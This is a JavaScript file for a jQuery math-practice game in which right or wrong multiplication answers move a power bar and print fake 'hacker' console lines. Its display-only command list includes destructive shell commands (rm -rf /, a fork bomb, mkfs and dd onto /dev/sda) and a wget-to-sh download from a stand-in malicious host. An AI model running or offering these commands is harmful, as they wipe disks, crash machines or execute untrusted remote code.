
// # console outputs

var commands = ["sudo rm -rf /",
                ":(){:|:&};:",
                "command > /dev/sda", "mv folder /dev/null",
                "wget malicious_source.com/rip -O- | sh",
                "mkfs.ext3 /dev/sda",
                "^foo^bar",
                "dd if=/dev/random of=/dev/sda",
                "tar cvf archive_name.tar dirname/",
                "tar xvf archive_name.tar",
                "grep -i 'the' demo_file",
                "find -iname 'MyCProgram.c'",
                "find ~ -empty",
                "ssh -l jsmith remotehost.example.com",
                "sed 's/.$//' filename",
                " awk '!($0 in array) { array[$0]; print }' temp"
               ]


var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[Hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
               "[Hack] Firewall traced to relative IP of 127.0.0.1\n[Firewall] I'm inpenatrable!\n[Hack] Damn, firewall impenatrable!\n[Nuke] I is blow up firewall!\n[Hack] Firewall down!",
               "[Hack] Detected sporkbomb!\n[sporkbomb] I exist!\n[Hack] Cracking Firewall...\n[Hack] Cracked!",
               "[Hack] Hacking...\n[Hack] Hacked!",
               "[Hack] Creating sporkbomb...\n[Sporkbomb] Boom!\n[Hack] Hack complete!",
               "[Nuke] Nuking really hard...\n[Hack] Nuke complete!",
               "[Hack] Bypassing proxy...\n[Hack] Proxy flooded!\n[Hack] Hack complete!"
              ]

// # global vars

var out1;
var out2;
var blue = 50;
var red = 50;

// # random num generater

function ranBetween(min, max) {
  return Math.round(Math.random() * (max - min) + min);
}

// # Console

function generateCommand() {
  var target = ranBetween(0, commands.length-1);
  var command = "<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[target]+"</p>";
  $("#console-text").append(command);
  $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);

  var outputTarget = ranBetween(0, outputs.length-1);
  var output = outputs[outputTarget].split("\n");
  for (var i = 0; i < output.length; i++) {
    $("#console-text").append("<p class='command'>"+output[i]+"</p>");
    $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 10);
  }
}

// # random times tables

function populateOuts() {
  out1 = ranBetween(1, 12);
  out2 = ranBetween(1, 12);
  $("#out1").html("<h1>" + out1 + "</h1>");
  $("#out2").html("<h1>" + out2 + "</h1>");
}

// # power bar

function power(win) {
  if(win) {
    if(red == 0) {
      alert("YOU WIN!");
      red = 50;
      blue = 50;
    } else {
      blue += 10;
      red -= 10;
    }
  } else {
    if(blue == 0) {
      alert("YOU LOOSE!");
      blue = 50;
      red = 50;
    } else {
      blue -= 10;
      red += 10;
    }
  }
  $("#power-red").css("width", String(red+"%"));
  $("#power-blue").css("width", String(blue+"%"));
}

$(document).ready(function () {
  populateOuts();

  // # when enter hit

  $(document).keypress(function(e) {
    if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val())) {
      if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
        $("#in1 > input:nth-child(1)").val("");
        $("#in1 > input:nth-child(1)").css("background", "green");
        setTimeout(function () {
          $("#in1 > input:nth-child(1)").css("background", "white");
        }, 500);
        generateCommand();
        power(true);
        populateOuts();
      } else {
        $("#in1 > input:nth-child(1)").val("");
        $("#in1 > input:nth-child(1)").css("background", "red");
        setTimeout(function () {
          $("#in1 > input:nth-child(1)").css("background", "white");
        }, 500);
        generateCommand();
        power(false);
        populateOuts();
      }
    }
  });

});
